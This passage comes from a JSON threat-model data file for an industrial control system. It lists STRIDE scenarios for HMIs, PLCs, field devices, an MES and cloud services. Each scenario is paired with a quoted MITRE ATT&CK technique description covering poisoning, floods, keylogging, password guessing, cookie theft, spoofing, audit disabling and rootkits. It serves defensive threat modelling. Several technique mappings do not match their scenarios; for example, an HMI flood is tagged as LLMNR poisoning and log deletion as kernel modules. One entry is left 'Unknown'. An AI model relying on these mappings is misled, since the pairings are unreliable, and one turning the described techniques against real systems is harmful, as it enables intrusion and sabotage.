            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the Control Center HMI with traffic, causing system slowdown or crash.",
            "Assumptions": [
                {
                    "Assumption": "Network rate limiting is not configured.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of rate limiting."
                },
                {
                    "Assumption": "The HMI can be connected from the public network.",
                    "Role": "System Architect",
                    "Condition": "HMI publicly accessible."
                },
                {
                    "Assumption": "No anti-DoS mechanisms in place.",
                    "Role": "Security Team",
                    "Condition": "Lack of DoS protection."
                }
            ],
            "Potential Impact": "Loss of system availability and productivity.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DoS",
                "flooding",
                "HMI",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware attack on cloud services results in temporary unavailability of the data storage system.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service is vulnerable to known malware.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Unpatched vulnerabilities."
                },
                {
                    "Assumption": "No real-time malware detection mechanisms are in place.",
                    "Role": "Security Team",
                    "Condition": "Inadequate malware protection."
                },
                {
                    "Assumption": "System lacks redundancy and failover mechanisms.",
                    "Role": "System Architect",
                    "Condition": "No redundancy protocols."
                }
            ],
            "Potential Impact": "Temporary data unavailability affects production continuity.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "cloud services",
                "data storage",
                "availability"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A targeted attack on PLCs causes multiple simultaneous failures, halting production.",
            "Assumptions": [
                {
                    "Assumption": "PLCs are not secured against unauthorized access.",
                    "Role": "System Administrator",
                    "Condition": "Weak or no device authentication."
                },
                {
                    "Assumption": "Network segmentation is inadequate.",
                    "Role": "Network Administrator",
                    "Condition": "Flat network architecture."
                },
                {
                    "Assumption": "No real-time monitoring or alerting system in place.",
                    "Role": "Security Team",
                    "Condition": "Lack of monitoring."
                }
            ],
            "Potential Impact": "Operational downtime and potential damage to equipment.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "PLC",
                "unauthorized access",
                "network segmentation",
                "real-time monitoring"
            ],
            "mitre_technique": {
                "name": "Denial of Service",
                "description": "Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected device functionality. Examples of DoS attacks include overwhelming the target device with a high volume of requests in a short time period and sending the target device a request it does not know how to handle. Disrupting device state may temporarily render it unresponsive, possibly lasting until a reboot can occur. When placed in this state, devices may be unable to send and receive requests, and may not perform expected response functions in reaction to other events in the environment. \n\nSome ICS devices are particularly sensitive to DoS events, and may become unresponsive in reaction to even a simple ping sweep. Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS) against certain devices, such as in the case of the BrickerBot malware. (Citation: ICS-CERT April 2017) \n\nAdversaries may exploit a software vulnerability to cause a denial of service by taking advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in software that can be used to cause a denial of service condition. \n\nAdversaries may have prior knowledge about industrial protocols or control devices used in the environment through [Remote System Information Discovery](https://attack.mitre.org/techniques/T0888). There are examples of adversaries remotely causing a [Device Restart/Shutdown](https://attack.mitre.org/techniques/T0816) by exploiting a vulnerability that induces uncontrolled resource consumption. (Citation: ICS-CERT August 2018) (Citation: Common Weakness Enumeration January 2019) (Citation: MITRE March 2018) ",
                "id": "attack-pattern--1b22b676-9347-4c55-9a35-ef0dc653db5b",
                "technique_id": "T0814"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious actor exploits a vulnerability in the MES to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The MES software has an unpatched security vulnerability.",
                    "Role": "System Administrator",
                    "Condition": "Lack of software updates."
                },
                {
                    "Assumption": "Access controls are insufficiently configured.",
                    "Role": "Security Administrator",
                    "Condition": "Poor access control configurations."
                },
                {
                    "Assumption": "The attacker can interact with the MES from the network.",
                    "Role": "Attacker",
                    "Condition": "Network accessibility."
                }
            ],
            "Potential Impact": "Complete control over production workflows and potential data tampering.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "MES",
                "administrative access",
                "network"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages weak authentication on field devices to execute higher-privileged commands.",
            "Assumptions": [
                {
                    "Assumption": "Authentication mechanisms on field devices are weak.",
                    "Role": "Device Manufacturer",
                    "Condition": "Weak or default credentials."
                },
                {
                    "Assumption": "Network traffic from field devices is not monitored.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of monitoring."
                },
                {
                    "Assumption": "There are no restrictions on the types of commands that non-privileged users can execute.",
                    "Role": "System Architect",
                    "Condition": "Weak command validation."
                }
            ],
            "Potential Impact": "Manipulation of control logic causing operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "weak authentication",
                "field devices",
                "command execution",
                "network"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An adversary escalates privileges by exploiting a misconfiguration in the cloud services API.",
            "Assumptions": [
                {
                    "Assumption": "The cloud services have misconfigured API permissions.",
                    "Role": "Cloud Service Administrator",
                    "Condition": "Incorrect API permission settings."
                },
                {
                    "Assumption": "The system does not employ adequate API security measures.",
                    "Role": "System Architect",
                    "Condition": "Lack of API security."
                },
                {
                    "Assumption": "No regular security audits for cloud configurations.",
                    "Role": "Security Team",
                    "Condition": "Irregular security reviews."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and critical cloud functionalities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "API exploitation",
                "misconfiguration",
                "network"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of an administrator to gain access to the Control Center's HMI.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained valid administrator credentials",
                    "Role": "Attacker",
                    "Condition": "Credentials compromised or guessed"
                },
                {
                    "Assumption": "The Control Center's HMI does not enforce multi-factor authentication",
                    "Role": "System Architect",
                    "Condition": "Lack of additional authentication mechanisms"
                },
                {
                    "Assumption": "The network does not monitor for abnormal login patterns",
                    "Role": "Network Engineer",
                    "Condition": "No anomaly detection"
                }
            ],
            "Potential Impact": "Unauthorized access to control systems leading to potential sabotage.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network",
                "control systems"
            ],
            "mitre_technique": {
                "name": "VNC",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
                "id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
                "technique_id": "T1021.005"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker pretends to be a legitimate cloud service to intercept data from the gateway.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is positioned to perform a man-in-the-middle attack",
                    "Role": "Attacker",
                    "Condition": "Network access between gateway and cloud"
                },
                {
                    "Assumption": "The gateway does not verify the identity of the cloud service explicitly",
                    "Role": "System Architect",
                    "Condition": "Lack of service verification"
                },
                {
                    "Assumption": "Data encryption is not end-to-end or properly enforced",
                    "Role": "System Engineer",
                    "Condition": "Weak encryption policies"
                }
            ],
            "Potential Impact": "Sensitive data interception leading to information disclosure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "data interception",
                "cloud service"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary uses fake field device identities to infiltrate the network.",
            "Assumptions": [
                {
                    "Assumption": "Field devices do not authenticate their identity to RTUs adequately",
                    "Role": "Device Manufacturer",
                    "Condition": "Lack of device authentication mechanisms"
                },
                {
                    "Assumption": "Network does not monitor for rogue devices",
                    "Role": "Network Engineer",
                    "Condition": "Lack of monitoring"
                },
                {
                    "Assumption": "The adversary has physical or remote access to connect rogue devices",
                    "Role": "Attacker",
                    "Condition": "Access to the facility or network"
                }
            ],
            "Potential Impact": "Network infiltration leading to potential data tampering or control disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device identity",
                "rogue device",
                "network infiltration"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies control commands sent from the Control Center to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not adequately encrypted",
                    "Role": "System Architect",
                    "Condition": "Weak or no encryption"
                },
                {
                    "Assumption": "The attacker can intercept and alter network traffic",
                    "Role": "Attacker",
                    "Condition": "Access to network traffic"
                },
                {
                    "Assumption": "The system lacks integrity checks for critical commands",
                    "Role": "System Engineer",
                    "Condition": "No message integrity verification"
                }
            ],
            "Potential Impact": "Corrupt or false commands leading to disruption of manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "control commands",
                "network traffic",
                "message integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to field devices and alters their settings.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are not secured against unauthorized access",
                    "Role": "System Architect",
                    "Condition": "Inadequate access control mechanisms"
                },
                {
                    "Assumption": "The attacker has physical or network access to the field devices",
                    "Role": "Attacker",
                    "Condition": "Direct or remote device access"
                },
                {
                    "Assumption": "No regular audits or checks are performed on the device configurations",
                    "Role": "System Administrator",
                    "Condition": "Lack of configuration audits"
                }
            ],
            "Potential Impact": "Operational disruption or safety hazards due to tampered device settings.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device settings",
                "unauthorized access",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--242ab378-5c77-4885-bfc3-ddfdee16cfba",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies the database within the MES to manipulate production workflows.",
            "Assumptions": [
                {
                    "Assumption": "The insider has sufficient privileges to access and modify the MES database",
                    "Role": "Insider",
                    "Condition": "Granting of database access rights"
                },
                {
                    "Assumption": "No integrity checks are present for database transactions",
                    "Role": "System Administrator",
                    "Condition": "Lack of transactional integrity checks"
                },
                {
                    "Assumption": "Database logs are not monitored for unauthorized changes",
                    "Role": "Security Engineer",
                    "Condition": "Lack of logging and monitoring"
                }
            ],
            "Potential Impact": "Data integrity issues leading to incorrect production schedules and workflows.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "insider threat",
                "production workflows"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider performs critical actions within the MES without being recorded, leading to disputes.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms do not capture all actions performed by users",
                    "Role": "System Architect",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "There is no non-repudiation mechanism (e.g., digital signatures)",
                    "Role": "System Engineer",
                    "Condition": "Lack of non-repudiation"
                },
                {
                    "Assumption": "User actions are not audited regularly",
                    "Role": "Security Analyst",
                    "Condition": "Lack of audit practices"
                }
            ],
            "Potential Impact": "Disputes over changes or actions taken, leading to operational and legal issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "insider actions",
                "dispute"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Linux Audit System",
                "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
                "id": "attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054",
                "technique_id": "T1562.012"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or modifies logs in the gateway to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored locally on the gateway without backup",
                    "Role": "System Architect",
                    "Condition": "Lack of remote log storage"
                },
                {
                    "Assumption": "The attacker has sufficient privileges to alter or delete logs",
                    "Role": "Attacker",
                    "Condition": "Gain of administrative access"
                },
                {
                    "Assumption": "Log integrity is not enforced through checksums or other methods",
                    "Role": "System Engineer",
                    "Condition": "No integrity mechanisms"
                }
            ],
            "Potential Impact": "Inability to trace actions leading to loss of accountability and forensic data.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "gateway",
                "forensic data"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny having performed specific actions in the cloud services due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not enforce detailed logging of user actions",
                    "Role": "Cloud Service Provider",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "There is no mechanism to link actions definitively to users",
                    "Role": "System Architect",
                    "Condition": "Lack of user-action linkage"
                },
                {
                    "Assumption": "Logs are not periodically reviewed or audited",
                    "Role": "Security Analyst",
                    "Condition": "Lack of log reviews"
                }
            ],
            "Potential Impact": "Difficulty in attributing actions, leading to operational and security challenges.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud services",
                "user actions",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
